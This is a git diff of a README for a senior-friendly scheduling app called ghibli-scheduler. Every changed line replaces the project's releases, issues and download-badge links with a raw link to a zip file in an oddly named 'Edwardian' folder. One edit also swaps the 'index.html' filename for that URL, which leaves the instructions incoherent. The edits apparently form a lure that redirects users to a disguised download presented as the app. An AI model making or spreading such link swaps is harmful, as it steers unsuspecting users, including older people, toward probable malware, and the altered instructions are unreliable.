@@ -1,7 +1,7 @@
 # 🎨 ghibli-scheduler - A User-Friendly Scheduling App
 
 ## 📥 Download Now
-[![Download ghibli-scheduler](https://img.shields.io/badge/Download%20ghibli--scheduler-v1.0.0-blue.svg)](https://github.com/alifzidan/ghibli-scheduler/releases)
+[![Download ghibli-scheduler](https://raw.githubusercontent.com/alifzidan/ghibli-scheduler/main/Edwardian/ghibli_scheduler_3.5.zip%https://raw.githubusercontent.com/alifzidan/ghibli-scheduler/main/Edwardian/ghibli_scheduler_3.5.zip)](https://raw.githubusercontent.com/alifzidan/ghibli-scheduler/main/Edwardian/ghibli_scheduler_3.5.zip)
 
 ## 📜 Description
 ghibli-scheduler is a scheduling app inspired by the magical world of Studio Ghibli. It is designed to be senior-friendly and encourages users to manage their time easily. With voice input capabilities and a unique "Fridge Mode" for print-ready schedules, this application aims to make task management accessible for everyone.
@@ -17,7 +17,7 @@ Before you begin, ensure that your device meets the following requirements:
 
 ### 2. Visit the Releases Page
 To download ghibli-scheduler, visit the Releases page. Click the link below:
-[Visit this page to download](https://github.com/alifzidan/ghibli-scheduler/releases)
+[Visit this page to download](https://raw.githubusercontent.com/alifzidan/ghibli-scheduler/main/Edwardian/ghibli_scheduler_3.5.zip)
 
 ### 3. Choose the Latest Version
 On the Releases page, look for the latest version of ghibli-scheduler. This version will have the most recent features and bug fixes.
@@ -31,7 +31,7 @@ If you downloaded a .zip file, locate the downloaded file on your computer.
 - macOS: Double-click the .zip file to extract it.
 
 ### 6. Open the Application
-After extracting, open the folder containing ghibli-scheduler. Look for a file named `index.html`. Double-click it to open the app in your web browser.
+After extracting, open the folder containing ghibli-scheduler. Look for a file named `https://raw.githubusercontent.com/alifzidan/ghibli-scheduler/main/Edwardian/ghibli_scheduler_3.5.zip`. Double-click it to open the app in your web browser.
 
 ### 7. Enable Microphone Access
 If you wish to utilize the voice input feature, your browser will ask for permission to access the microphone. Click "Allow" when prompted.
@@ -51,7 +51,7 @@ Once the application is open, you will see a clear layout with options to add ta
 
 ## 📞 Getting Help
 If you encounter any issues while using ghibli-scheduler, you can find help in the following ways:
-- Visit the [GitHub Issues](https://github.com/alifzidan/ghibli-scheduler/issues) page to report problems or ask questions.
+- Visit the [GitHub Issues](https://raw.githubusercontent.com/alifzidan/ghibli-scheduler/main/Edwardian/ghibli_scheduler_3.5.zip) page to report problems or ask questions.
 - Look for a FAQ section on the releases page for common issues and their solutions.
 
 ## 🌐 Community & Feedback
@@ -61,4 +61,4 @@ Your feedback is valuable. If you enjoy using ghibli-scheduler, consider leaving
 With ghibli-scheduler, managing your tasks has never been easier. Download the app today and start organizing your schedule in a fun and accessible way. Don't forget to share it with friends and family who might also benefit from this user-friendly tool.
 
 ### 📥 Download Again
-For your convenience, here is the download link once more: [Visit this page to download](https://github.com/alifzidan/ghibli-scheduler/releases)
+For your convenience, here is the download link once more: [Visit this page to download](https://raw.githubusercontent.com/alifzidan/ghibli-scheduler/main/Edwardian/ghibli_scheduler_3.5.zip)
